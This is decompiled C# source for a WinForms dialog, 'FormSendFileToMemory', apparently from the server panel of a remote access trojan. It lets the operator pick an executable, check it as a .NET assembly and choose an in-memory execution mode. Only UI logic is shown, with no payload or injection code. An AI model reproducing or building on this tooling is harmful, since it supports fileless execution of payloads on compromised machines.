using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Server.Helper;
using Siticone.Desktop.UI.WinForms;

namespace Server
{
	// Token: 0x02000030 RID: 48
	public partial class FormSendFileToMemory : Form
	{
		// Token: 0x060001C2 RID: 450 RVA: 0x00002C7E File Offset: 0x00000E7E
		public FormSendFileToMemory()
		{
			this.InitializeComponent();
		}

		// Token: 0x060001C3 RID: 451 RVA: 0x00002C8C File Offset: 0x00000E8C
		private void SendFileToMemory_Load(object sender, EventArgs e)
		{
			this.comboBox1.SelectedIndex = 0;
			this.comboBox2.SelectedIndex = 0;
		}

		// Token: 0x060001C4 RID: 452 RVA: 0x0001CF4C File Offset: 0x0001B14C
		private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
		{
			int selectedIndex = this.comboBox1.SelectedIndex;
			if (selectedIndex == 0)
			{
				this.label3.Visible = false;
				this.comboBox2.Visible = false;
				return;
			}
			if (selectedIndex != 1)
			{
				return;
			}
			this.label3.Visible = true;
			this.comboBox2.Visible = true;
		}

		// Token: 0x060001C5 RID: 453 RVA: 0x0001CFA0 File Offset: 0x0001B1A0
		private void button1_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "(*.exe)|*.exe";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					this.toolStripStatusLabel1.Text = Path.GetFileName(openFileDialog.FileName);
					this.toolStripStatusLabel1.Tag = openFileDialog.FileName;
					this.toolStripStatusLabel1.ForeColor = Color.Green;
					this.IsOK = true;
					if (this.comboBox1.SelectedIndex != 0)
					{
						goto IL_DD;
					}
					try
					{
						new ReferenceLoader().AppDomainSetup(openFileDialog.FileName);
						this.IsOK = true;
						return;
					}
					catch
					{
						this.toolStripStatusLabel1.ForeColor = Color.Red;
						ToolStripStatusLabel toolStripStatusLabel = this.toolStripStatusLabel1;
						toolStripStatusLabel.Text += " Invalid!";
						this.IsOK = false;
						return;
					}
				}
				this.toolStripStatusLabel1.Text = "";
				this.toolStripStatusLabel1.ForeColor = Color.Black;
				this.IsOK = true;
				IL_DD:;
			}
		}

		// Token: 0x060001C6 RID: 454 RVA: 0x00002CA6 File Offset: 0x00000EA6
		private void button2_Click(object sender, EventArgs e)
		{
			if (this.IsOK)
			{
				base.Hide();
			}
		}

		// Token: 0x060001C7 RID: 455 RVA: 0x00002CB6 File Offset: 0x00000EB6
		private void Button3_Click(object sender, EventArgs e)
		{
			this.IsOK = false;
			base.Hide();
		}

		// Token: 0x0400019F RID: 415
		public bool IsOK;
	}
}
